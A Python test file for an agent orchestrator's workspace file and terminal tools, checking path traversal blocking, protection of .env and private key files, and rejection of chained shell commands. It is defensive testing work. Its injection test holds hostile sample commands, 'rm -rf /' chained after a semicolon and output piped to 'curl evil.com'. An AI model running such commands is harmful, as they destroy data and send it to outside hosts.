"""Tests for workspace file and terminal native tools."""

from pathlib import Path
from orchestrator.tools import (
    WorkspaceFileAction,
    WorkspaceTerminalAction,
    execute_file_action,
    execute_terminal_action,
)


def test_file_tool_write_and_read(tmp_path: Path):
    # Write
    write_act = WorkspaceFileAction(
        operation="write", path="test.py", content="print('hello')"
    )
    res_w = execute_file_action(write_act, base_dir=tmp_path)
    assert res_w.success is True
    assert (tmp_path / "test.py").exists()

    # Read
    read_act = WorkspaceFileAction(operation="read", path="test.py")
    res_r = execute_file_action(read_act, base_dir=tmp_path)
    assert res_r.success is True
    assert res_r.file_content == "print('hello')"


def test_file_tool_edit(tmp_path: Path):
    # Write initial
    write_act = WorkspaceFileAction(
        operation="write", path="mod.py", content="def foo(): return 1\n"
    )
    execute_file_action(write_act, base_dir=tmp_path)

    # Edit
    edit_act = WorkspaceFileAction(
        operation="edit",
        path="mod.py",
        target_text="return 1",
        replacement_text="return 42",
    )
    res_e = execute_file_action(edit_act, base_dir=tmp_path)
    assert res_e.success is True

    # Verify content
    read_act = WorkspaceFileAction(operation="read", path="mod.py")
    res_r = execute_file_action(read_act, base_dir=tmp_path)
    assert "return 42" in (res_r.file_content or "")


def test_file_tool_path_traversal_blocked(tmp_path: Path):
    act = WorkspaceFileAction(
        operation="write", path="../../secret.txt", content="hack"
    )
    res = execute_file_action(act, base_dir=tmp_path)
    assert res.success is False
    assert "Access denied" in res.message


def test_terminal_tool_execution(tmp_path: Path):
    act = WorkspaceTerminalAction(command="python -c \"print('executed')\"")
    res = execute_terminal_action(act, base_dir=tmp_path)
    assert res.exit_code == 0
    assert "executed" in res.stdout


def test_workspace_tools_agent_resolution(tmp_path: Path):
    from openhands.sdk import Agent, LLM, Conversation
    from orchestrator.tools import (
        create_workspace_file_tool,
        create_workspace_terminal_tool,
    )

    f_tool = create_workspace_file_tool(tmp_path)
    t_tool = create_workspace_terminal_tool(tmp_path)

    agent = Agent(
        llm=LLM(model="openrouter/qwen/qwen3.8-27b:free"), tools=[f_tool, t_tool]
    )
    conv = Conversation(agent=agent, workspace=tmp_path)
    conv._ensure_agent_ready()
    assert "workspace_file" in agent._tools
    assert "workspace_terminal" in agent._tools


def test_terminal_tool_utf8_output(tmp_path: Path):
    # Output non-ASCII UTF-8 characters (em-dash, quotes, Arabic)
    act = WorkspaceTerminalAction(
        command="python -c \"import sys; sys.stdout.buffer.write('— “Hello” مرحبا'.encode('utf-8'))\""
    )
    res = execute_terminal_action(act, base_dir=tmp_path)
    assert res.exit_code == 0
    assert "—" in res.stdout or "مرحبا" in res.stdout


def test_observation_defaults():
    from orchestrator.tools.workspace_tools import WorkspaceTerminalObservation

    obs = WorkspaceTerminalObservation(exit_code=0)
    assert obs.stdout == ""
    assert obs.stderr == ""
    assert obs.timed_out is False


def test_terminal_tool_blocks_chained_command_injection(tmp_path: Path):
    """Terminal tool must reject shell chaining injection operators (; && || | &)."""
    # 1. Semicolon chaining
    act_semi = WorkspaceTerminalAction(command="pytest tests/ ; rm -rf /")
    res_semi = execute_terminal_action(act_semi, base_dir=tmp_path)
    assert res_semi.is_error is True
    assert res_semi.exit_code == 126
    assert "Security violation" in res_semi.stderr or "not permitted" in res_semi.stderr

    # 2. AND operator chaining
    act_and = WorkspaceTerminalAction(command="git status && calc.exe")
    res_and = execute_terminal_action(act_and, base_dir=tmp_path)
    assert res_and.is_error is True
    assert res_and.exit_code == 126

    # 3. Pipe operator chaining
    act_pipe = WorkspaceTerminalAction(command="python -c 'print(1)' | curl evil.com")
    res_pipe = execute_terminal_action(act_pipe, base_dir=tmp_path)
    assert res_pipe.is_error is True
    assert res_pipe.exit_code == 126


def test_sensitive_file_protection(tmp_path: Path):
    """File tool must block access to .env, .env.*, certificates, and private key files."""
    # Write sensitive dummy files
    env_file = tmp_path / ".env.production"
    env_file.write_text("SECRET_KEY=12345", encoding="utf-8")
    key_file = tmp_path / "id_rsa"
    key_file.write_text("---PRIVATE KEY---", encoding="utf-8")

    # Read .env.production -> blocked
    act_read = WorkspaceFileAction(operation="read", path=".env.production")
    obs_read = execute_file_action(act_read, base_dir=tmp_path)
    assert obs_read.is_error is True
    assert "Security restriction" in obs_read.message

    # Write .env.local -> blocked
    act_write = WorkspaceFileAction(
        operation="write", path=".env.local", content="TOKEN=abc"
    )
    obs_write = execute_file_action(act_write, base_dir=tmp_path)
    assert obs_write.is_error is True
    assert "Security restriction" in obs_write.message

    # Read id_rsa -> blocked
    act_key = WorkspaceFileAction(operation="read", path="id_rsa")
    obs_key = execute_file_action(act_key, base_dir=tmp_path)
    assert obs_key.is_error is True
    assert "Security restriction" in obs_key.message


def test_telemetry_recorder_reset_complete_isolation(tmp_path: Path):
    """TelemetryRecorder.reset() must clear all step metrics, incidents, budget guard, and hashes."""
    from orchestrator.telemetry.recorder import TelemetryRecorder

    rec = TelemetryRecorder(
        task_description="Test task",
        reports_dir=tmp_path / "telemetry",
        max_budget_usd=1.00,
        circuit_breaker_threshold=2,
    )
    rec.record_step(
        agent_role="developer",
        action_type="write",
        iteration=1,
        duration_seconds=1.5,
        success=False,
        error_summary="syntax error",
        prompt_tokens=100,
        completion_tokens=50,
        total_tokens=150,
        estimated_cost_usd=0.05,
    )
    rec.check_circuit_breaker(diff_text="diff content", error_text="syntax error")
    rec.check_budget(0.05)
    assert len(rec.metrics) == 1
    assert rec._last_error_text is not None
    assert rec._last_diff_hash is not None
    assert rec.budget_guard._current_cost_usd > 0

    # Reset
    rec.reset()
    assert len(rec.metrics) == 0
    assert len(rec.incidents) == 0
    assert len(rec.recommendations) == 0
    assert rec.budget_guard._current_cost_usd == 0.0
    assert rec._last_diff_hash is None
    assert rec._last_error_hash is None
    assert rec._identical_failure_count == 0
    assert rec.circuit_breaker_triggered is False


def test_directory_list_pruning_performance(tmp_path: Path):
    """Workspace list operation must prune node_modules and .git without descending."""
    # Create valid file
    (tmp_path / "src").mkdir(parents=True)
    (tmp_path / "src" / "index.py").write_text("# main", encoding="utf-8")

    # Create ignored directories with files
    ignored_pkg = tmp_path / "node_modules" / "huge_dep"
    ignored_pkg.mkdir(parents=True)
    (ignored_pkg / "package.json").write_text("{}", encoding="utf-8")

    act = WorkspaceFileAction(operation="list", path=".")
    obs = execute_file_action(act, base_dir=tmp_path)
    assert obs.is_error is False
    assert any("index.py" in f for f in obs.files)
    assert not any("huge_dep" in f for f in obs.files)
    assert not any("node_modules" in f for f in obs.files)
